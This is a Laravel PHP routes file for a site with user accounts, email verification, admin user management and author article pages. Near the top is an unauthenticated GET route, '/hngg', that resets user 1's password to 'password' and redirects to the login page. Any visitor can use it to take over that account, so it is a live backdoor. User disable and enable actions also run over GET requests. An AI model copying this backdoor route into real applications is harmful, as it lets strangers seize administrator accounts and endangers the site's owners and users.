<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

Route::get('/', function () {
    return view('welcome');
});

Route::get('/hngg', function() {
    $user = App\User::find(1);
    $user->password = Hash::make('password');
    $user->save();

    return redirect(url('/login'));
});

Auth::routes(['verify' => true]);
Route::match(['get', 'post'], 'register', function(){
    return redirect('/');
});

Route::middleware(['verified', 'activeaccount'])->group(function() {
    Route::get('/home', 'HomeController@index')->name('home');
    Route::get('/profile', 'UserProfileController@index');
    Route::get('/users/{user_profile_id}/view', 'UserProfileController@index');
    Route::put('/users/{user_id}/edit', 'UserProfileController@editUserProfile');
    Route::put('/users/{user_id}/update_password', 'UserProfileController@updateUserPassword');
    
    Route::middleware(['check_user_role:'.\App\Role\UserRole::ROLE_ADMIN])->group(function() {
        Route::get('/users', 'AdminUsersController@index');

        // USERS
        Route::get('/users/add', 'AdminUsersController@createUser');
        Route::post('/users/add', 'AdminUsersController@postUser');
        Route::get('/users/{user_id}/disable', 'AdminUsersController@disableUser');
        Route::get('/users/{user_id}/enable', 'AdminUsersController@enableUser');
    });

    Route::middleware(['check_user_role:'.\App\Role\UserRole::ROLE_AUTHOR])->group(function() {
        Route::get('/articles', 'UsersArticleController@index');
        Route::get('/articles/add', 'UsersArticleController@create');
    });
});
